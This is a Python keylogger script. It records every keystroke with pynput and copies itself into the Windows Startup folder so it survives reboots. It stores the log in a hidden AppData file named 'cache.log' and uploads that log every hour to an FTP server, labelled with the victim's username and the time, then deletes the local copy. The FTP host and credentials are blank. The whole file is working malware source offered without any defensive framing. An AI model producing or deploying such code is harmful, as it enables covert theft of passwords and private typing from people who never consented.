from pynput.keyboard import Listener
import os
import ftplib
import time
import threading
import datetime
import getpass
import shutil


class KeyLogger:
    """Key logger class"""
    def __init__(self, filename, host, user, passwd):
		# copies program to startup
        shutil.copyfile(os.path.basename(__file__), os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup'))
        # creates a path for the log file, hides it in local appdata
        self.filename = os.path.join(os.getenv('LOCALAPPDATA'), filename)
        # creates ftp variables
        self.host = host
        self.user = user
        self.passwd = passwd

    def start_logging(self):
        # create separate thread that uploads the logged keys to an FTP
        threading.Thread(target=self.upload_log).start()
        # listens for key input, when a key is pressed the log key function is called
        with Listener(on_press=self.log_keypress) as listener:
            listener.join()

    def log_keypress(self, key):
        # saves the acquired key press to a log file
        with open(self.filename, 'a') as f:
            # in case a non character key is pressed
            try:
                f.write(key.char)
            except AttributeError:
                f.write(' <' + str(key) + '> ')

    def upload_log(self):
        # creates infinite loop
        while True:
            # uploads logs every hour
            time.sleep(3600)

            # connects to the ftp server
            session = ftplib.FTP(self.host, self.user, self.passwd)

            # gets current user/time to use as the name
            name = getpass.getuser()
            date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # reads the file and uploads it to the ftp server
            session.storbinary('STOR ' + name + ' ' + date, open(self.filename, 'rb'))
            session.quit()

            # deletes the file once uploaded
            time.sleep(1)
            os.remove(filename)


def main():
    # initialises KeyLogger
    keys = KeyLogger(filename='cache.log', host='', user='', passwd='')
    # starts logging keys
    keys.start_logging()

if __name__ == '__main__':
    main()